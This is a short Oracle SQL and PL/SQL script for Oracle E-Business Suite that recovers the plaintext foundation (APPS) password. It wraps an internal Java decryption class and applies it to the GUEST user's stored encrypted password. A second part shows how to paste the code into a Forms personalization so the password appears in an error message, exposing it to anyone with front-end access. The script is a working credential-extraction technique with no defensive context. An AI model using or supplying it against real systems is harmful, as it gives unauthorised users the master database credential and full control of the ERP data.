create or replace function decrypt_pin_func(in_chr_key           in varchar2,
                                            in_chr_encrypted_pin in varchar2)
  return varchar2 as
  language java name 'oracle.apps.fnd.security.WebSessionManagerProc.decrypt(java.lang.String,java.lang.String) return java.lang.String';
--
select apps.decrypt_pin_func('GUEST/ORACLE', encrypted_foundation_password) from apps.fnd_user where user_name = 'GUEST';



------------------
--Personalize
--builtin => execute a procedure => paste the below script into Agrument
='declare
  v_pass varchar2(3000);
begin
  select apps.decrypt_pin_func(''GUEST/ORACLE'',
                               encrypted_foundation_password)
    into v_pass
    from apps.fnd_user
   where user_name = ''GUEST'';
  raise_application_error(-20010, v_pass);
end'